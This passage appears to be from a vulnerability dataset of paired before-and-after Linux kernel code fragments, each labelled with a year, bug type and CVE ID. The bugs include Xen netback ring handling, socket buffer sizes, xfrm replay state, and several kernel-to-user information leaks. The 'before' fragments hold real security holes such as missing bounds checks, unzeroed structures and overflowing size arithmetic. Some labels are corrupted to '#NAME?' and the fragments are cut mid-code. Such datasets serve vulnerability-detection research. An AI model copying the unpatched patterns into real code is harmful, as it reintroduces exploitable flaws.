 netdev_dbg(vif->dev, ""Need more frags\n"");

 return -frags;
		}

 if (unlikely(frags >= MAX_SKB_FRAGS)) {
 netdev_dbg(vif->dev, ""Too many frags\n"");

 return -frags;
		}

 memcpy(txp, RING_GET_REQUEST(&vif->tx, cons + frags),
 sizeof(*txp));
 if (txp->size > first->size) {
 netdev_dbg(vif->dev, ""Frags galore\n"");

 return -frags;
		}

		first->size -= txp->size;
		frags++;

 if (unlikely((txp->offset + txp->size) > PAGE_SIZE)) {
 netdev_dbg(vif->dev, ""txp->offset: %x, size: %u\n"",
				 txp->offset, txp->size);

 return -frags;
		}
	} while ((txp++)->flags & XEN_NETTXF_more_data);

 do {
 if (unlikely(work_to_do-- <= 0)) {
 netdev_dbg(vif->dev, ""Missing extra info\n"");

 return -EBADR;
		}

 if (unlikely(!extra.type ||
			     extra.type >= XEN_NETIF_EXTRA_TYPE_MAX)) {
			vif->tx.req_cons = ++cons;
 netdev_dbg(vif->dev,
 ""Invalid extra type: %d\n"", extra.type);

 return -EINVAL;
		}

 struct xen_netif_extra_info *gso)
{
 if (!gso->u.gso.size) {
 netdev_dbg(vif->dev, ""GSO size must not be zero.\n"");

 return -EINVAL;
	}

 /* Currently only TCPv4 S.O. is supported. */
 if (gso->u.gso.type != XEN_NETIF_GSO_TYPE_TCPV4) {
 netdev_dbg(vif->dev, ""Bad GSO type %d.\n"", gso->u.gso.type);

 return -EINVAL;
	}


 /* Get a netif from the list with work to do. */
		vif = poll_net_schedule_list(netbk);





 if (!vif)
 continue;












 RING_FINAL_CHECK_FOR_REQUESTS(&vif->tx, work_to_do);
 if (!work_to_do) {
 xenvif_put(vif);
			work_to_do = xen_netbk_get_extras(vif, extras,
							  work_to_do);
			idx = vif->tx.req_cons;
 if (unlikely(work_to_do < 0)) {
 netbk_tx_err(vif, &txreq, idx);
 continue;
			}
		}

		ret = netbk_count_requests(vif, &txreq, txfrags, work_to_do);
 if (unlikely(ret < 0)) {
 netbk_tx_err(vif, &txreq, idx - ret);
 continue;
		}
		idx += ret;

 if (unlikely(txreq.size < ETH_HLEN)) {

 /* No crossing a page as the payload mustn't fragment. */
 if (unlikely((txreq.offset + txreq.size) > PAGE_SIZE)) {
 netdev_dbg(vif->dev,
 ""txreq.offset: %x, size: %u, end: %lu\n"",
				   txreq.offset, txreq.size,
				   (txreq.offset&~PAGE_MASK) + txreq.size);
 netbk_tx_err(vif, &txreq, idx);
 continue;
		}

			gso = &extras[XEN_NETIF_EXTRA_TYPE_GSO - 1];

 if (netbk_set_skb_gso(vif, skb, gso)) {

 kfree_skb(skb);
 netbk_tx_err(vif, &txreq, idx);
 continue;
			}
		}
","/* Notify xenvif that ring now has space to send an skb to the frontend */
void xenvif_notify_tx_completion(struct xenvif *vif);

/* Prevent the device from generating any further traffic. */
void xenvif_carrier_off(struct xenvif *vif);

/* Returns number of ring slots required to send an skb to the frontend */
unsigned int xen_netbk_count_skb_slots(struct xenvif *vif, struct sk_buff *skb);

 return err;
}

void xenvif_carrier_off(struct xenvif *vif)
{
 struct net_device *dev = vif->dev;

 rtnl_lock();
 netif_carrier_off(dev); /* discard queued packets */
 if (netif_running(dev))
 xenvif_down(vif);
 rtnl_unlock();
 xenvif_put(vif);
}

void xenvif_disconnect(struct xenvif *vif)
{
 if (netif_carrier_ok(vif->dev))
 xenvif_carrier_off(vif);

 atomic_dec(&vif->refcnt);
 wait_event(vif->waiting_to_free, atomic_read(&vif->refcnt) == 0);
 xenvif_put(vif);
}

static void netbk_fatal_tx_err(struct xenvif *vif)
{
 netdev_err(vif->dev, ""fatal error; disabling device\n"");
 xenvif_carrier_off(vif);
 xenvif_put(vif);
}

static int netbk_count_requests(struct xenvif *vif,
 struct xen_netif_tx_request *first,
 struct xen_netif_tx_request *txp,

 do {
 if (frags >= work_to_do) {
 netdev_err(vif->dev, ""Need more frags\n"");
 netbk_fatal_tx_err(vif);
 return -frags;
		}

 if (unlikely(frags >= MAX_SKB_FRAGS)) {
 netdev_err(vif->dev, ""Too many frags\n"");
 netbk_fatal_tx_err(vif);
 return -frags;
		}

 memcpy(txp, RING_GET_REQUEST(&vif->tx, cons + frags),
 sizeof(*txp));
 if (txp->size > first->size) {
 netdev_err(vif->dev, ""Frag is bigger than frame.\n"");
 netbk_fatal_tx_err(vif);
 return -frags;
		}

		first->size -= txp->size;
		frags++;

 if (unlikely((txp->offset + txp->size) > PAGE_SIZE)) {
 netdev_err(vif->dev, ""txp->offset: %x, size: %u\n"",
				 txp->offset, txp->size);
 netbk_fatal_tx_err(vif);
 return -frags;
		}
	} while ((txp++)->flags & XEN_NETTXF_more_data);

 do {
 if (unlikely(work_to_do-- <= 0)) {
 netdev_err(vif->dev, ""Missing extra info\n"");
 netbk_fatal_tx_err(vif);
 return -EBADR;
		}

 if (unlikely(!extra.type ||
			     extra.type >= XEN_NETIF_EXTRA_TYPE_MAX)) {
			vif->tx.req_cons = ++cons;
 netdev_err(vif->dev,
 ""Invalid extra type: %d\n"", extra.type);
 netbk_fatal_tx_err(vif);
 return -EINVAL;
		}

 struct xen_netif_extra_info *gso)
{
 if (!gso->u.gso.size) {
 netdev_err(vif->dev, ""GSO size must not be zero.\n"");
 netbk_fatal_tx_err(vif);
 return -EINVAL;
	}

 /* Currently only TCPv4 S.O. is supported. */
 if (gso->u.gso.type != XEN_NETIF_GSO_TYPE_TCPV4) {
 netdev_err(vif->dev, ""Bad GSO type %d.\n"", gso->u.gso.type);
 netbk_fatal_tx_err(vif);
 return -EINVAL;
	}


 /* Get a netif from the list with work to do. */
		vif = poll_net_schedule_list(netbk);
 /* This can sometimes happen because the test of
		 * list_empty(net_schedule_list) at the top of the
		 * loop is unlocked.  Just go back and have another
		 * look.
 */
 if (!vif)
 continue;

 if (vif->tx.sring->req_prod - vif->tx.req_cons >
		    XEN_NETIF_TX_RING_SIZE) {
 netdev_err(vif->dev,
 ""Impossible number of requests. ""
 ""req_prod %d, req_cons %d, size %ld\n"",
				   vif->tx.sring->req_prod, vif->tx.req_cons,
				   XEN_NETIF_TX_RING_SIZE);
 netbk_fatal_tx_err(vif);
 continue;
		}

 RING_FINAL_CHECK_FOR_REQUESTS(&vif->tx, work_to_do);
 if (!work_to_do) {
 xenvif_put(vif);
			work_to_do = xen_netbk_get_extras(vif, extras,
							  work_to_do);
			idx = vif->tx.req_cons;
 if (unlikely(work_to_do < 0))

 continue;

		}

		ret = netbk_count_requests(vif, &txreq, txfrags, work_to_do);
 if (unlikely(ret < 0))

 continue;

		idx += ret;

 if (unlikely(txreq.size < ETH_HLEN)) {

 /* No crossing a page as the payload mustn't fragment. */
 if (unlikely((txreq.offset + txreq.size) > PAGE_SIZE)) {
 netdev_err(vif->dev,
 ""txreq.offset: %x, size: %u, end: %lu\n"",
				   txreq.offset, txreq.size,
				   (txreq.offset&~PAGE_MASK) + txreq.size);
 netbk_fatal_tx_err(vif);
 continue;
		}

			gso = &extras[XEN_NETIF_EXTRA_TYPE_GSO - 1];

 if (netbk_set_skb_gso(vif, skb, gso)) {
 /* Failure in netbk_set_skb_gso is fatal. */
 kfree_skb(skb);

 continue;
			}
		}
"
2013,DoS ,CVE-2013-0190,,
2013,#NAME?,CVE-2013-0160,,
2019,Overflow Mem. Corr. ,CVE-2012-6712,"#include ""iwl-trans.h""

/* priv->shrd->sta_lock must be held */
static void iwl_sta_ucode_activate(struct iwl_priv *priv, u8 sta_id)
{




 if (!(priv->stations[sta_id].used & IWL_STA_DRIVER_ACTIVE))
 IWL_ERR(priv, ""ACTIVATE a non DRIVER active station id %u ""
 ""addr %pM\n"",
 IWL_DEBUG_ASSOC(priv, ""Added STA id %u addr %pM to uCode\n"",
				sta_id, priv->stations[sta_id].sta.sta.addr);
	}

}

static int iwl_process_add_sta_resp(struct iwl_priv *priv,
 switch (pkt->u.add_sta.status) {
 case ADD_STA_SUCCESS_MSK:
 IWL_DEBUG_INFO(priv, ""REPLY_ADD_STA PASSED\n"");
 iwl_sta_ucode_activate(priv, sta_id);
		ret = 0;
 break;
 case ADD_STA_NO_ROOM_IN_TABLE:
 IWL_ERR(priv, ""Adding station %d failed, no room in table.\n"",
","#include ""iwl-trans.h""

/* priv->shrd->sta_lock must be held */
static int iwl_sta_ucode_activate(struct iwl_priv *priv, u8 sta_id)
{
 if (sta_id >= IWLAGN_STATION_COUNT) {
 IWL_ERR(priv, ""invalid sta_id %u"", sta_id);
 return -EINVAL;
	}
 if (!(priv->stations[sta_id].used & IWL_STA_DRIVER_ACTIVE))
 IWL_ERR(priv, ""ACTIVATE a non DRIVER active station id %u ""
 ""addr %pM\n"",
 IWL_DEBUG_ASSOC(priv, ""Added STA id %u addr %pM to uCode\n"",
				sta_id, priv->stations[sta_id].sta.sta.addr);
	}
 return 0;
}

static int iwl_process_add_sta_resp(struct iwl_priv *priv,
 switch (pkt->u.add_sta.status) {
 case ADD_STA_SUCCESS_MSK:
 IWL_DEBUG_INFO(priv, ""REPLY_ADD_STA PASSED\n"");
		ret = iwl_sta_ucode_activate(priv, sta_id);

 break;
 case ADD_STA_NO_ROOM_IN_TABLE:
 IWL_ERR(priv, ""Adding station %d failed, no room in table.\n"",
"
2016,DoS Overflow Mem. Corr. ,CVE-2012-6704," break;
 case SO_SNDBUF:
 /* Don't error on this BSD doesn't and if you think
		   about it this is right. Otherwise apps have to
		   play 'guess the biggest size' games. RCVBUF/SNDBUF
		   are treated in BSD as hints */

 if (val > sysctl_wmem_max)
			val = sysctl_wmem_max;
set_sndbuf:
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
 if ((val * 2) < SOCK_MIN_SNDBUF)
			sk->sk_sndbuf = SOCK_MIN_SNDBUF;
 else
			sk->sk_sndbuf = val * 2;

 /*
		 *	Wake up sending tasks if we
		 *	upped the value.
 */
		sk->sk_write_space(sk);
 break;


 case SO_RCVBUF:
 /* Don't error on this BSD doesn't and if you think
		   about it this is right. Otherwise apps have to
		   play 'guess the biggest size' games. RCVBUF/SNDBUF
		   are treated in BSD as hints */

 if (val > sysctl_rmem_max)
			val = sysctl_rmem_max;
set_rcvbuf:
		sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
 /*
		 * returning the value we actually used in getsockopt
		 * is the most desirable behavior.
 */
 if ((val * 2) < SOCK_MIN_RCVBUF)
			sk->sk_rcvbuf = SOCK_MIN_RCVBUF;
 else
			sk->sk_rcvbuf = val * 2;
 break;

 case SO_RCVBUFFORCE:
 break;

 case SO_PASSCRED:
		v.val = test_bit(SOCK_PASSCRED, &sock->flags) ? 1 : 0;
 break;

 case SO_PEERCRED:
 break;

 case SO_PASSSEC:
		v.val = test_bit(SOCK_PASSSEC, &sock->flags) ? 1 : 0;
 break;

 case SO_PEERSEC:
"," break;
 case SO_SNDBUF:
 /* Don't error on this BSD doesn't and if you think
		 * about it this is right. Otherwise apps have to
		 * play 'guess the biggest size' games. RCVBUF/SNDBUF
		 * are treated in BSD as hints
 */
		val = min_t(u32, val, sysctl_wmem_max);

set_sndbuf:
		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		sk->sk_sndbuf = max_t(u32, val * 2, SOCK_MIN_SNDBUF);
 /* Wake up sending tasks if we upped the value. */







		sk->sk_write_space(sk);
 break;


 case SO_RCVBUF:
 /* Don't error on this BSD doesn't and if you think
		 * about it this is right. Otherwise apps have to
		 * play 'guess the biggest size' games. RCVBUF/SNDBUF
		 * are treated in BSD as hints
 */
		val = min_t(u32, val, sysctl_rmem_max);

set_rcvbuf:
		sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
 /*
		 * returning the value we actually used in getsockopt
		 * is the most desirable behavior.
 */
		sk->sk_rcvbuf = max_t(u32, val * 2, SOCK_MIN_RCVBUF);



 break;

 case SO_RCVBUFFORCE:
 break;

 case SO_PASSCRED:
		v.val = !!test_bit(SOCK_PASSCRED, &sock->flags);
 break;

 case SO_PEERCRED:
 break;

 case SO_PASSSEC:
		v.val = !!test_bit(SOCK_PASSSEC, &sock->flags);
 break;

 case SO_PEERSEC:
"
2016,DoS Overflow ,CVE-2012-6703," unsigned int buffer_size;
 void *buffer;





	buffer_size = params->buffer.fragment_size * params->buffer.fragments;
 if (stream->ops->copy) {
		buffer = NULL;
"," unsigned int buffer_size;
 void *buffer;

 if (params->buffer.fragment_size == 0 ||
	    params->buffer.fragments > SIZE_MAX / params->buffer.fragment_size)
 return -EINVAL;

	buffer_size = params->buffer.fragment_size * params->buffer.fragments;
 if (stream->ops->copy) {
		buffer = NULL;
"
2016,DoS Overflow ,CVE-2012-6701," if (ret < 0)
 goto out;





	kiocb->ki_nr_segs = kiocb->ki_nbytes;
	kiocb->ki_cur_seg = 0;
 /* ki_nbytes/left now reflect bytes instead of segs */
 return ret;
}

static ssize_t aio_setup_single_vector(struct kiocb *kiocb)
{






	kiocb->ki_iovec = &kiocb->ki_inline_vec;
	kiocb->ki_iovec->iov_base = kiocb->ki_buf;
	kiocb->ki_iovec->iov_len = kiocb->ki_left;
	kiocb->ki_nr_segs = 1;
	kiocb->ki_cur_seg = 0;
 return 0;
 if (unlikely(!access_ok(VERIFY_WRITE, kiocb->ki_buf,
			kiocb->ki_left)))
 break;
		ret = security_file_permission(file, MAY_READ);
 if (unlikely(ret))
 break;
		ret = aio_setup_single_vector(kiocb);
 if (ret)
 break;
		ret = -EINVAL;
 if (unlikely(!access_ok(VERIFY_READ, kiocb->ki_buf,
			kiocb->ki_left)))
 break;
		ret = security_file_permission(file, MAY_WRITE);
 if (unlikely(ret))
 break;
		ret = aio_setup_single_vector(kiocb);
 if (ret)
 break;
		ret = -EINVAL;
		ret = -EBADF;
 if (unlikely(!(file->f_mode & FMODE_READ)))
 break;
		ret = security_file_permission(file, MAY_READ);
 if (unlikely(ret))
 break;
		ret = aio_setup_vectored_rw(READ, kiocb, compat);
 if (ret)
 break;
		ret = -EBADF;
 if (unlikely(!(file->f_mode & FMODE_WRITE)))
 break;
		ret = security_file_permission(file, MAY_WRITE);
 if (unlikely(ret))
 break;
		ret = aio_setup_vectored_rw(WRITE, kiocb, compat);
 if (ret)
 break;
"," if (ret < 0)
 goto out;

	ret = rw_verify_area(type, kiocb->ki_filp, &kiocb->ki_pos, ret);
 if (ret < 0)
 goto out;

	kiocb->ki_nr_segs = kiocb->ki_nbytes;
	kiocb->ki_cur_seg = 0;
 /* ki_nbytes/left now reflect bytes instead of segs */
 return ret;
}

static ssize_t aio_setup_single_vector(int type, struct file * file, struct kiocb *kiocb)
{
 int bytes;

	bytes = rw_verify_area(type, file, &kiocb->ki_pos, kiocb->ki_left);
 if (bytes < 0)
 return bytes;

	kiocb->ki_iovec = &kiocb->ki_inline_vec;
	kiocb->ki_iovec->iov_base = kiocb->ki_buf;
	kiocb->ki_iovec->iov_len = bytes;
	kiocb->ki_nr_segs = 1;
	kiocb->ki_cur_seg = 0;
 return 0;
 if (unlikely(!access_ok(VERIFY_WRITE, kiocb->ki_buf,
			kiocb->ki_left)))
 break;
		ret = aio_setup_single_vector(READ, file, kiocb);



 if (ret)
 break;
		ret = -EINVAL;
 if (unlikely(!access_ok(VERIFY_READ, kiocb->ki_buf,
			kiocb->ki_left)))
 break;
		ret = aio_setup_single_vector(WRITE, file, kiocb);



 if (ret)
 break;
		ret = -EINVAL;
		ret = -EBADF;
 if (unlikely(!(file->f_mode & FMODE_READ)))
 break;



		ret = aio_setup_vectored_rw(READ, kiocb, compat);
 if (ret)
 break;
		ret = -EBADF;
 if (unlikely(!(file->f_mode & FMODE_WRITE)))
 break;



		ret = aio_setup_vectored_rw(WRITE, kiocb, compat);
 if (ret)
 break;
"
2016,,CVE-2012-6689,"		dst_pid = addr->nl_pid;
		dst_group = ffs(addr->nl_groups);
		err =  -EPERM;
 if (dst_group && !netlink_capable(sock, NL_NONROOT_SEND))

 goto out;
	} else {
		dst_pid = nlk->dst_pid;
 rcu_assign_pointer(nl_table[NETLINK_USERSOCK].listeners, listeners);
	nl_table[NETLINK_USERSOCK].module = THIS_MODULE;
	nl_table[NETLINK_USERSOCK].registered = 1;


 netlink_table_ungrab();
}
","		dst_pid = addr->nl_pid;
		dst_group = ffs(addr->nl_groups);
		err =  -EPERM;
 if ((dst_group || dst_pid) &&
		    !netlink_capable(sock, NL_NONROOT_SEND))
 goto out;
	} else {
		dst_pid = nlk->dst_pid;
 rcu_assign_pointer(nl_table[NETLINK_USERSOCK].listeners, listeners);
	nl_table[NETLINK_USERSOCK].module = THIS_MODULE;
	nl_table[NETLINK_USERSOCK].registered = 1;
	nl_table[NETLINK_USERSOCK].nl_nonroot = NL_NONROOT_SEND;

 netlink_table_ungrab();
}
"
2014,DoS ,CVE-2012-6657,"
 case SO_KEEPALIVE:
#ifdef CONFIG_INET
 if (sk->sk_protocol == IPPROTO_TCP)

 tcp_set_keepalive(sk, valbool);
#endif
 sock_valbool_flag(sk, SOCK_KEEPOPEN, valbool);
","
 case SO_KEEPALIVE:
#ifdef CONFIG_INET
 if (sk->sk_protocol == IPPROTO_TCP &&
		    sk->sk_type == SOCK_STREAM)
 tcp_set_keepalive(sk, valbool);
#endif
 sock_valbool_flag(sk, SOCK_KEEPOPEN, valbool);
"
2014,DoS ,CVE-2012-6647," * @uaddr2:	the pi futex we will take prior to returning to user-space
 *
 * The caller will wait on uaddr and will be requeued by futex_requeue() to
 * uaddr2 which must be PI aware.  Normal wakeup will wake on uaddr2 and
 * complete the acquisition of the rt_mutex prior to returning to userspace.
 * This ensures the rt_mutex maintains an owner when it has waiters; without
 * one, the pi logic wouldn't know which task to boost/deboost, if there was a
 * need to.
 *
 * We call schedule in futex_wait_queue_me() when we enqueue and return there
 * via the following:
 struct futex_q q = futex_q_init;
 int res, ret;




 if (!bitset)
 return -EINVAL;

"," * @uaddr2:	the pi futex we will take prior to returning to user-space
 *
 * The caller will wait on uaddr and will be requeued by futex_requeue() to
 * uaddr2 which must be PI aware and unique from uaddr.  Normal wakeup will wake
 * on uaddr2 and complete the acquisition of the rt_mutex prior to returning to
 * userspace.  This ensures the rt_mutex maintains an owner when it has waiters;
 * without one, the pi logic would not know which task to boost/deboost, if
 * there was a need to.
 *
 * We call schedule in futex_wait_queue_me() when we enqueue and return there
 * via the following:
 struct futex_q q = futex_q_init;
 int res, ret;

 if (uaddr == uaddr2)
 return -EINVAL;

 if (!bitset)
 return -EINVAL;

"
2014,DoS ,CVE-2012-6638," goto discard;

 if (th->syn) {


 if (icsk->icsk_af_ops->conn_request(sk, skb) < 0)
 return 1;

"," goto discard;

 if (th->syn) {
 if (th->fin)
 goto discard;
 if (icsk->icsk_af_ops->conn_request(sk, skb) < 0)
 return 1;

"
2013,#NAME?,CVE-2012-6549,"	len = 3;
	fh32[0] = ei->i_iget5_block;
 	fh16[2] = (__u16)ei->i_iget5_offset;  /* fh16 [sic] */

	fh32[2] = inode->i_generation;
 if (parent) {
 struct iso_inode_info *eparent;
","	len = 3;
	fh32[0] = ei->i_iget5_block;
 	fh16[2] = (__u16)ei->i_iget5_offset;  /* fh16 [sic] */
	fh16[3] = 0;  /* avoid leaking uninitialized data */
	fh32[2] = inode->i_generation;
 if (parent) {
 struct iso_inode_info *eparent;
"
2013,#NAME?,CVE-2012-6548,"	*lenp = 3;
	fid->udf.block = location.logicalBlockNum;
	fid->udf.partref = location.partitionReferenceNum;

	fid->udf.generation = inode->i_generation;

 if (parent) {
","	*lenp = 3;
	fid->udf.block = location.logicalBlockNum;
	fid->udf.partref = location.partitionReferenceNum;
	fid->udf.parent_partref = 0;
	fid->udf.generation = inode->i_generation;

 if (parent) {
"
2013,#NAME?,CVE-2012-6547," int vnet_hdr_sz;
 int ret;

 if (cmd == TUNSETIFF || _IOC_TYPE(cmd) == 0x89)
 if (copy_from_user(&ifr, argp, ifreq_len))
 return -EFAULT;



 if (cmd == TUNGETFEATURES) {
 /* Currently this just means: ""what IFF flags are valid?"".
"," int vnet_hdr_sz;
 int ret;

 if (cmd == TUNSETIFF || _IOC_TYPE(cmd) == 0x89) {
 if (copy_from_user(&ifr, argp, ifreq_len))
 return -EFAULT;
	} else
 memset(&ifr, 0, sizeof(ifr));

 if (cmd == TUNGETFEATURES) {
 /* Currently this just means: ""what IFF flags are valid?"".
"
2013,#NAME?,CVE-2012-6546,"
 if (!vcc->dev || !test_bit(ATM_VF_ADDR, &vcc->flags))
 return -ENOTCONN;

		pvc.sap_family = AF_ATMPVC;
		pvc.sap_addr.itf = vcc->dev->number;
		pvc.sap_addr.vpi = vcc->vpi;
","
 if (!vcc->dev || !test_bit(ATM_VF_ADDR, &vcc->flags))
 return -ENOTCONN;
 memset(&pvc, 0, sizeof(pvc));
		pvc.sap_family = AF_ATMPVC;
		pvc.sap_addr.itf = vcc->dev->number;
		pvc.sap_addr.vpi = vcc->vpi;
"
2013,#NAME?,CVE-2012-6545,"
 BT_DBG(""sock %p, sk %p"", sock, sk);


	sa->rc_family  = AF_BLUETOOTH;
	sa->rc_channel = rfcomm_pi(sk)->channel;
 if (peer)
","
 BT_DBG(""sock %p, sk %p"", sock, sk);

 memset(sa, 0, sizeof(*sa));
	sa->rc_family  = AF_BLUETOOTH;
	sa->rc_channel = rfcomm_pi(sk)->channel;
 if (peer)
"
2013,#NAME?,CVE-2012-6544,"	*addr_len = sizeof(*haddr);
	haddr->hci_family = AF_BLUETOOTH;
	haddr->hci_dev    = hdev->id;


 release_sock(sk);
 return 0;
","	*addr_len = sizeof(*haddr);
	haddr->hci_family = AF_BLUETOOTH;
	haddr->hci_dev    = hdev->id;
	haddr->hci_channel= 0;

 release_sock(sk);
 return 0;
"
2013,#NAME?,CVE-2012-6543,"	lsa->l2tp_family = AF_INET6;
	lsa->l2tp_flowinfo = 0;
	lsa->l2tp_scope_id = 0;

 if (peer) {
 if (!lsk->peer_conn_id)
 return -ENOTCONN;
","	lsa->l2tp_family = AF_INET6;
	lsa->l2tp_flowinfo = 0;
	lsa->l2tp_scope_id = 0;
	lsa->l2tp_unused = 0;
 if (peer) {
 if (!lsk->peer_conn_id)
 return -ENOTCONN;
"
2013,#NAME?,CVE-2012-6542," struct sockaddr_llc sllc;
 struct sock *sk = sock->sk;
 struct llc_sock *llc = llc_sk(sk);
 int rc = 0;

 memset(&sllc, 0, sizeof(sllc));
 lock_sock(sk);
 if (sock_flag(sk, SOCK_ZAPPED))
 goto out;
	*uaddrlen = sizeof(sllc);
 memset(uaddr, 0, *uaddrlen);
 if (peer) {
		rc = -ENOTCONN;
 if (sk->sk_state != TCP_ESTABLISHED)
"," struct sockaddr_llc sllc;
 struct sock *sk = sock->sk;
 struct llc_sock *llc = llc_sk(sk);
 int rc = -EBADF;

 memset(&sllc, 0, sizeof(sllc));
 lock_sock(sk);
 if (sock_flag(sk, SOCK_ZAPPED))
 goto out;
	*uaddrlen = sizeof(sllc);

 if (peer) {
		rc = -ENOTCONN;
 if (sk->sk_state != TCP_ESTABLISHED)
"
2013,#NAME?,CVE-2012-6541," case DCCP_SOCKOPT_CCID_TX_INFO:
 if (len < sizeof(tfrc))
 return -EINVAL;

		tfrc.tfrctx_x	   = hc->tx_x;
		tfrc.tfrctx_x_recv = hc->tx_x_recv;
		tfrc.tfrctx_x_calc = hc->tx_x_calc;
"," case DCCP_SOCKOPT_CCID_TX_INFO:
 if (len < sizeof(tfrc))
 return -EINVAL;
 memset(&tfrc, 0, sizeof(tfrc));
		tfrc.tfrctx_x	   = hc->tx_x;
		tfrc.tfrctx_x_recv = hc->tx_x_recv;
		tfrc.tfrctx_x_calc = hc->tx_x_calc;
"
2013,#NAME?,CVE-2012-6540,"	{
 struct ip_vs_timeout_user t;


 __ip_vs_get_timeouts(net, &t);
 if (copy_to_user(user, &t, sizeof(t)) != 0)
			ret = -EFAULT;
","	{
 struct ip_vs_timeout_user t;

 memset(&t, 0, sizeof(t));
 __ip_vs_get_timeouts(net, &t);
 if (copy_to_user(user, &t, sizeof(t)) != 0)
			ret = -EFAULT;
"
2013,#NAME?,CVE-2012-6539," if (copy_from_user(&ifc32, uifc32, sizeof(struct compat_ifconf)))
 return -EFAULT;


 if (ifc32.ifcbuf == 0) {
		ifc32.ifc_len = 0;
		ifc.ifc_len = 0;
"," if (copy_from_user(&ifc32, uifc32, sizeof(struct compat_ifconf)))
 return -EFAULT;

 memset(&ifc, 0, sizeof(ifc));
 if (ifc32.ifcbuf == 0) {
		ifc32.ifc_len = 0;
		ifc.ifc_len = 0;
"
2013,#NAME?,CVE-2012-6538," return -EMSGSIZE;

	algo = nla_data(nla);
 strcpy(algo->alg_name, auth->alg_name);
 memcpy(algo->alg_key, auth->alg_key, (auth->alg_key_len + 7) / 8);
	algo->alg_key_len = auth->alg_key_len;

"," return -EMSGSIZE;

	algo = nla_data(nla);
 strncpy(algo->alg_name, auth->alg_name, sizeof(algo->alg_name));
 memcpy(algo->alg_key, auth->alg_key, (auth->alg_key_len + 7) / 8);
	algo->alg_key_len = auth->alg_key_len;

"
2013,#NAME?,CVE-2012-6537,"
static void copy_to_user_state(struct xfrm_state *x, struct xfrm_usersa_info *p)
{

 memcpy(&p->id, &x->id, sizeof(p->id));
 memcpy(&p->sel, &x->sel, sizeof(p->sel));
 memcpy(&p->lft, &x->lft, sizeof(p->lft));
","
static void copy_to_user_state(struct xfrm_state *x, struct xfrm_usersa_info *p)
{
 memset(p, 0, sizeof(*p));
 memcpy(&p->id, &x->id, sizeof(p->id));
 memcpy(&p->sel, &x->sel, sizeof(p->sel));
 memcpy(&p->lft, &x->lft, sizeof(p->lft));
"
2013,#NAME?,CVE-2012-6536,"	__u32	bitmap;
};



struct xfrm_replay_state_esn {
 unsigned int	bmp_len;
	__u32		oseq;
 struct nlattr **attrs)
{
 struct nlattr *rt = attrs[XFRMA_REPLAY_ESN_VAL];


 if ((p->flags & XFRM_STATE_ESN) && !rt)
 return -EINVAL;












 if (!rt)
 return 0;
 struct nlattr *rp)
{
 struct xfrm_replay_state_esn *up;


 if (!replay_esn || !rp)
 return 0;

	up = nla_data(rp);


 if (xfrm_replay_state_esn_len(replay_esn) !=
 xfrm_replay_state_esn_len(up))
 return -EINVAL;

 return 0;
 struct nlattr *rta)
{
 struct xfrm_replay_state_esn *p, *pp, *up;


 if (!rta)
 return 0;

	up = nla_data(rta);



	p = kmemdup(up, xfrm_replay_state_esn_len(up), GFP_KERNEL);
 if (!p)
 return -ENOMEM;

	pp = kmemdup(up, xfrm_replay_state_esn_len(up), GFP_KERNEL);
 if (!pp) {
 kfree(p);
 return -ENOMEM;
	}




	*replay_esn = p;
	*preplay_esn = pp;

","	__u32	bitmap;
};

#define XFRMA_REPLAY_ESN_MAX 4096

struct xfrm_replay_state_esn {
 unsigned int	bmp_len;
	__u32		oseq;
 struct nlattr **attrs)
{
 struct nlattr *rt = attrs[XFRMA_REPLAY_ESN_VAL];
 struct xfrm_replay_state_esn *rs;

 if (p->flags & XFRM_STATE_ESN) {
 if (!rt)
 return -EINVAL;

		rs = nla_data(rt);

 if (rs->bmp_len > XFRMA_REPLAY_ESN_MAX / sizeof(rs->bmp[0]) / 8)
 return -EINVAL;

 if (nla_len(rt) < xfrm_replay_state_esn_len(rs) &&
 nla_len(rt) != sizeof(*rs))
 return -EINVAL;
	}

 if (!rt)
 return 0;
 struct nlattr *rp)
{
 struct xfrm_replay_state_esn *up;
 int ulen;

 if (!replay_esn || !rp)
 return 0;

	up = nla_data(rp);
	ulen = xfrm_replay_state_esn_len(up);

 if (nla_len(rp) < ulen || xfrm_replay_state_esn_len(replay_esn) != ulen)

 return -EINVAL;

 return 0;
 struct nlattr *rta)
{
 struct xfrm_replay_state_esn *p, *pp, *up;
 int klen, ulen;

 if (!rta)
 return 0;

	up = nla_data(rta);
	klen = xfrm_replay_state_esn_len(up);
	ulen = nla_len(rta) >= klen ? klen : sizeof(*up);

	p = kzalloc(klen, GFP_KERNEL);
 if (!p)
 return -ENOMEM;

	pp = kzalloc(klen, GFP_KERNEL);
 if (!pp) {
 kfree(p);
 return -ENOMEM;
	}

 memcpy(p, up, ulen);
 memcpy(pp, up, ulen);

	*replay_esn = p;
	*preplay_esn = pp;

"
2012,DoS ,CVE-2012-5532,"		len = recvfrom(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0,
				addr_p, &addr_l);

 if (len < 0 || addr.nl_pid) {
 syslog(LOG_ERR, ""recvfrom failed; pid:%u error:%d %s"",
					addr.nl_pid, errno, strerror(errno));
 close(fd);
 return -1;
		}







		incoming_msg = (struct nlmsghdr *)kvp_recv_buffer;
		incoming_cn_msg = (struct cn_msg *)NLMSG_DATA(incoming_msg);
		hv_msg = (struct hv_kvp_msg *)incoming_cn_msg->data;
","		len = recvfrom(fd, kvp_recv_buffer, sizeof(kvp_recv_buffer), 0,
				addr_p, &addr_l);

 if (len < 0) {
 syslog(LOG_ERR, ""recvfrom failed; pid:%u error:%d %s"",
					addr.nl_pid, errno, strerror(errno));
 close(fd);
 return -1;
		}

 if (addr.nl_pid) {
 syslog(LOG_WARNING, ""Received packet from untrusted pid:%u"",
					addr.nl_pid);
 continue;
		}

		incoming_msg = (struct nlmsghdr *)kvp_recv_buffer;
		incoming_cn_msg = (struct cn_msg *)NLMSG_DATA(incoming_msg);
		hv_msg = (struct hv_kvp_msg *)incoming_cn_msg->data;
"
2012,DoS ,CVE-2012-5517,"
	zone->present_pages += onlined_pages;
	zone->zone_pgdat->node_present_pages += onlined_pages;
 if (need_zonelists_rebuild)
 build_all_zonelists(NULL, zone);
 else
 zone_pcp_update(zone);




 mutex_unlock(&zonelists_mutex);

 init_per_zone_wmark_min();

 if (onlined_pages) {
 kswapd_run(zone_to_nid(zone));
 node_set_state(zone_to_nid(zone), N_HIGH_MEMORY);
	}

	vm_total_pages = nr_free_pagecache_pages();

","
	zone->present_pages += onlined_pages;
